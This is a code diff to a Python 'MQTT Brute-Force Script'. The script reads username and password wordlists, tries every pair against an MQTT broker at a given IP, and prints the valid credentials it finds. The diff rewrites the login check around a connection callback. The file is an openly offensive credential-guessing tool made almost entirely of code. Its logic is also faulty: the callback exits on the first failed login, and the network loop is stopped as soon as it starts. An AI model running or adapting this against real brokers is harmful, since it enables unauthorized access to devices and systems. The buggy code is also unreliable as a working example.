@@ -2,7 +2,21 @@ import argparse
 from termcolor import colored
 import paho.mqtt.client as mqtt
 
+valid_credentials_found = False
+
+def on_connect(client, userdata, flags, rc):
+    global valid_credentials_found
+    if rc == 0:
+        valid_credentials_found = True
+        print(colored(f"Valid credentials found: {client._username}:{client._password}", "green"))
+        # Do something here after successful login
+        client.disconnect()
+    else:
+        print("Failed to connect with MQTT broker. Error code:", rc)
+        exit(1)
+
 def brute_force_mqtt(ip, port, username_file, password_file):
+    global valid_credentials_found
     with open(username_file, 'r') as user_file:
         usernames = user_file.read().splitlines()
     with open(password_file, 'r') as pass_file:
@@ -12,14 +26,16 @@ def brute_force_mqtt(ip, port, username_file, password_file):
         for password in passwords:
             client = mqtt.Client()
             client.username_pw_set(username, password)
-            try:
-                client.connect(ip, port)
-                print(colored(f"Successful login: {username}:{password}", "green"))
-                # Do something here after successful login
-                client.disconnect()
+            client.on_connect = on_connect
+
+            client.connect(ip, port)
+            client.loop_start()
+            client.loop_stop()
+
+            if valid_credentials_found:
                 return  # Stop testing once successful login is found
-            except:
-                print(f"Failed login: {username}:{password}")
+
+    print("No valid credentials found.")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="MQTT Brute-Force Script")
